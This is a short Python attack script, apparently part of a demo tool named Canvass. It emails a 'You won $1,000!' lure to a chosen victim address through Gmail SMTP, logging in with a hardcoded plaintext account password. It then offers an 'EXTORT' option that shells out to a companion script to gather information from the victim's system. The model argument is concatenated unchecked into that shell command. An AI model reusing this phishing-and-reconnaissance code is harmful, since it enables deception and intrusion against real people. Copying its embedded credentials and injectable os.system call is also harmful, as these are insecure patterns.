"""Usage:
    ukraine.py <model> -v <victimemailaddress>

Options:
    -h --help   Display this help message
    --version   (c) Sayonsom Chanda, 2017. Canvass 0.0.1
                MIT License. Attribution required.
                Software provided AS IS. No WARRANTIES.
"""
from __future__ import unicode_literals
import smtplib
import os
from email.mime.text import MIMEText
from docopt import docopt


def loadFromEmailFile():
    fp = open('emailfile.txt', 'rb')
    msg = MIMEText(fp.read())
    fp.close()
    return msg

def sendPhishingEmail(model, victim):
    msg = loadFromEmailFile()

    #me = "canvassattackdemo@yahoo.com"
    me = "sayonsom.home@gmail.com"
    msg['Subject'] = '[Canvass DEMO] You won $1,000!'
    msg['From'] = me
    msg['To'] = victim

    #s = smtplib.SMTP('smtp.mail.yahoo.com', 587)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.ehlo()
    s.starttls()
    s.ehlo()
    #s.login(me, "sillystupidpassword123")
    s.login(me, "googleSupreme$9")
    try:
        s.sendmail(me, [victim], msg.as_string())
        print("[!] Email sent. Victim should receive the email shortly. [3-4 Minutes]")
        extort = raw_input("[?] Do you want to get the victim's system status? [1 for EXTORT, anything else to BE NICE >>> ]")
        if extort == "1":
            try:
                attackString = "python pf.py " + model + " getinfo"
                os.system(attackString)
                print("[i] Victim System Exposed. Reconnaissance Complete.")
            except:
                print("[!] Previous Malware failed. Or System you were looking for is not found. Try again.")
        else:
            print(":) Thanks for not extorting. Please inform system admin if you found a security flaw in your victim's system")
    except:
        print("[!] Sorry. Failed to Phish. Issues with the attacker's email username and password. LOL!")
    s.quit()

if __name__ == '__main__':
    arguments = docopt(__doc__, version='Canvass 0.0.1')
    victim = arguments['<victimemailaddress>']
    model = arguments['<model>']
    sendPhishingEmail(model,victim)
